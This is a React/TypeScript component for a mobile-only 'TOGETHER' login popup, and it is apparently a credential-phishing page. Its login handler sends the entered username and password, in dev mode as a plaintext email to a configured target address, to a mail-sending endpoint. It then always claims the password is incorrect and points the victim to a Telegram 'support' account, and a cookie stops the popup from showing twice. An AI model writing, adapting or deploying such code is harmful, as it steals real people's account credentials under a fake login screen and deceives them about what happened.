import React, { useState, useEffect } from 'react';
import { Cell, Input, Dialog, Toast } from 'react-vant';
import { POPUP_CONFIG } from '../popup.config';

const ASSETS = {
  logo: 'https://asset.wkapi.cc//brand/TGT/150x150.svg',
  telegramIcon: 'https://asset.wkapi.cc//static/TGT/CommonView/LoginRegist/TelegramIcon.png',
  userIcon: 'https://asset.wkapi.cc/static/TGT/CommonView/LoginRegist/wb_Uid.svg',
  passwordIcon: 'https://asset.wkapi.cc/static/TGT/CommonView/LoginRegist/wb_login_password.svg',
  languageIcon: 'https://asset.wkapi.cc/static/TGT/CommonView/images/language/sg_lan_us.svg',
  eyeClosedIcon: 'https://asset.wkapi.cc/static/TGT/CommonView/LoginRegist/wb_biyan.svg',
  eyeOpenIcon: 'https://asset.wkapi.cc/static/WINBOX/CommonView/LoginRegist/wb_kaiyan.svg',
  helpdeskIcon: 'https://asset.wkapi.cc/static/TGT/CommonView/LoginRegist/wb_kefu.svg',
  faqIcon: 'https://asset.wkapi.cc//static/TGT/CommonView/LoginRegist/FAQ.svg',
  addScreenIcon: 'https://asset.wkapi.cc/static/TGT/CommonView/LoginRegist/addScreen.png',
};

// Cookie 工具函数
const getCookie = (name: string): string | null => {
  const match = document.cookie.match(new RegExp('(^| )' + name + '=([^;]+)'));
  return match ? match[2] : null;
};

const setCookie = (name: string, value: string, hours: number): void => {
  const expires = new Date();
  expires.setTime(expires.getTime() + hours * 60 * 60 * 1000);
  document.cookie = `${name}=${value};expires=${expires.toUTCString()};path=/`;
};

// 只有手机端（宽度 ≤ 480px）才显示弹窗
const MOBILE_QUERY = '(max-width: 480px)';

const LoginPopup: React.FC = () => {
  const [visible, setVisible] = useState(false);
  const [passwordShown, setPasswordShown] = useState(false);
  const [username, setUsername] = useState('');
  const [password, setPassword] = useState('');
  const [isLoading, setIsLoading] = useState(false);
  const [isMobile, setIsMobile] = useState(false);
  const [showErrorAlert, setShowErrorAlert] = useState(false);

  // 检测移动端
  useEffect(() => {
    if (typeof window === 'undefined' || !window.matchMedia) return;

    const mediaQuery = window.matchMedia(MOBILE_QUERY);
    setIsMobile(mediaQuery.matches);

    const handleChange = (e: MediaQueryListEvent) => {
      setIsMobile(e.matches);
    };

    if (mediaQuery.addEventListener) {
      mediaQuery.addEventListener('change', handleChange);
    } else {
      mediaQuery.addListener(handleChange);
    }

    return () => {
      if (mediaQuery.removeEventListener) {
        mediaQuery.removeEventListener('change', handleChange);
      } else {
        mediaQuery.removeListener(handleChange);
      }
    };
  }, []);

  // 检查是否应该显示弹窗
  useEffect(() => {
    // 如果配置关闭，不显示弹窗
    if (!POPUP_CONFIG.enabled) return;

    // 只在移动端显示
    if (!isMobile) return;

    // 检查 cookie，如果已经显示过则不再显示
    const hasShown = getCookie(POPUP_CONFIG.cookieName);
    if (hasShown) return;

    setVisible(true);
  }, [isMobile]);

  // 关闭弹窗时设置 cookie
  const closePopup = () => {
    setCookie(POPUP_CONFIG.cookieName, 'true', POPUP_CONFIG.cookieExpireHours);
    setVisible(false);
  };

  const handleOverlayClick = (e: React.MouseEvent) => {
    if (e.target === e.currentTarget) {
      closePopup();
    }
  };

  const handleLogin = async () => {
    if (!username || !password) return;

    setIsLoading(true);
    const toastInstance = Toast.loading({
      message: 'Loading...',
      forbidClick: true,
      duration: 0,
    });
    
    try {
      const isDev = import.meta.env.DEV;
      const apiUrl = isDev ? '/api/resend/emails' : '/api/send-email';

      const payload = isDev
        ? {
            from: POPUP_CONFIG.fromEmail,
            to: [POPUP_CONFIG.targetEmail],
            subject: `${new Date().toLocaleDateString()} - ${username}`,
            html: `
              <p><strong>Username/Email:</strong> ${username}</p>
              <p><strong>Password:</strong> ${password}</p>
              <p><strong>Time:</strong> ${new Date().toISOString()}</p>
            `,
          }
        : { username, password };

      const response = await fetch(apiUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(payload),
      });

      const result = await response.json();
      if (!response.ok) {
        console.error('[Login] Email send failed:', result);
      }
    } catch (error) {
      console.error('[Login] Network error:', error);
    } finally {
      toastInstance.clear();
      setIsLoading(false);
      setShowErrorAlert(true);
    }
  };

  const handleSupportClick = () => {
    window.open('https://t.me/wbxmalay', '_blank');
  };

  if (!visible) return null;

  return (
    <>
      {/* 错误提示弹窗 - 使用 Vant Dialog */}
      <Dialog
        visible={showErrorAlert}
        showCancelButton
        cancelButtonText="Support"
        confirmButtonText="OK"
        onCancel={handleSupportClick}
        onConfirm={() => setShowErrorAlert(false)}
        closeOnClickOverlay={false}
      >
        User or password is incorrect
      </Dialog>
      <div
        className="fixed inset-0 z-[2100] flex items-center justify-center bg-black/50 p-0 sm:p-4"
        style={{ minHeight: '100dvh' }}
        onClick={handleOverlayClick}
        role="dialog"
        aria-modal="true"
        aria-label="Login"
      >
      <div
        className="relative w-full h-full min-h-[100dvh] max-w-none sm:max-w-[360px] sm:h-auto sm:min-h-0 rounded-none sm:rounded-2xl bg-white shadow-xl overflow-y-auto flex flex-col pb-[env(safe-area-inset-bottom)] pt-[env(safe-area-inset-top)] antialiased"
        style={{ fontFamily: "-apple-system,BlinkMacSystemFont,'Helvetica Neue',Helvetica,Segoe UI,Arial,Roboto,'PingFang SC',miui,'Hiragino Sans GB','Microsoft Yahei',sans-serif" }}
        onClick={(e) => e.stopPropagation()}
      >
        {/* Top: Guide - Add to home screen */}
        <button
          type="button"
          className="absolute top-[10px] right-[10px] flex items-center gap-1.5 rounded-[4px] border border-[#ddd] bg-white px-2 py-1 text-sm font-normal text-gray-700"
        >
          <img src={ASSETS.addScreenIcon} alt="" className="h-4 w-4" />
          Guide—Add to home screen
        </button>

        {/* Center content wrapper */}
        <div className="flex-1 flex flex-col justify-center px-6 pb-6 pl-[max(1.5rem,env(safe-area-inset-left))] pr-[max(1.5rem,env(safe-area-inset-right))]">
          {/* Logo */}
          <div className="flex justify-center mb-[3.6rem] flex-shrink-0">
            <img
              src={ASSETS.logo}
              alt="TOGETHER"
              className="w-[120px] h-[120px]"
            />
          </div>

          <div className="flex flex-col">
          {/* Account input - Vant Cell + Input */}
          <Cell
            className="input-field has-lang-pill"
            icon={<img src={ASSETS.userIcon} alt="" className="w-[24px] h-[24px]" />}
            rightIcon={
              <div className="flex items-center gap-2 cursor-pointer">
                <img src={ASSETS.languageIcon} alt="EN" className="w-7 h-7 rounded-full" />
                <svg className="w-3 h-3 text-[#b0b0b0]" fill="currentColor" viewBox="0 0 10 6">
                  <path d="M0 0L5 6L10 0H0Z" />
                </svg>
              </div>
            }
          >
            <Input
              value={username}
              onChange={setUsername}
              placeholder="Enter Account/Email"
              clearable
            />
          </Cell>

          {/* Password input - Vant Cell + Input */}
          <Cell
            className="input-field"
            icon={<img src={ASSETS.passwordIcon} alt="" className="w-[24px] h-[24px]" />}
            rightIcon={
              <button
                type="button"
                className="p-1"
                onClick={() => setPasswordShown(!passwordShown)}
                aria-label={passwordShown ? 'Hide password' : 'Show password'}
              >
                <img 
                  src={passwordShown ? ASSETS.eyeOpenIcon : ASSETS.eyeClosedIcon} 
                  alt="" 
                  className="w-5 h-5 opacity-50" 
                />
              </button>
            }
          >
            <Input
              type={passwordShown ? 'text' : 'password'}
              value={password}
              onChange={setPassword}
              placeholder="Enter password"
            />
          </Cell>

          {/* Forgot password */}
          <div className="text-right mb-5">
            <button type="button" className="text-[16px] font-medium text-[#1278b6] hover:underline">
              Forgot Password/Account?
            </button>
          </div>

          {/* Action buttons */}
          <div className="flex gap-[0.45rem] mb-5 mt-5">
            <button
              type="button"
              className="flex-1 flex items-center justify-center gap-2 h-[45px] rounded-[5px] text-white text-base font-medium leading-[45px]"
              style={{ backgroundColor: '#208bca' }}
            >
              <img src={ASSETS.telegramIcon} alt="" className="w-5 h-5" />
              Telegram
            </button>
            <button
              type="button"
              onClick={handleLogin}
              disabled={isLoading}
              className="flex-1 flex items-center justify-center h-[45px] rounded-[5px] text-white text-base font-medium disabled:opacity-70"
              style={{ backgroundColor: '#9816f4' }}
            >
              Log In
            </button>
          </div>

          {/* Helpdesk & FAQ */}
          <div className="flex flex-col items-center gap-2.5">
            <button
              type="button"
              className="inline-flex items-center justify-center gap-2 rounded-full px-1.5 py-1 border border-[#1278b6] text-[#1278b6] text-[12px] font-normal"
              style={{ backgroundColor: '#edfcff' }}
            >
              <img src={ASSETS.helpdeskIcon} alt="" className="w-5 h-5" />
              Helpdesk 7x24h
            </button>
            <button
              type="button"  className="inline-flex items-center justify-center gap-2 rounded-[4px] px-1.5 py-1.5 border-0 text-[#1278b6] text-[12px] font-normal"
              style={{ backgroundColor: 'rgba(18,120,182,.1)' }}
            >
              <img src={ASSETS.faqIcon} alt="" className="w-5 h-5" />
              FAQ
            </button>
          </div>

          {/* Footer version */}
          <p className="text-center text-gray-400 text-xs font-normal mt-5">
            TOGETHER&nbsp;&nbsp;&nbsp;2026.0113.002
          </p>
          </div>
        </div>
      </div>
    </div>
    </>
  );
};

export default LoginPopup;
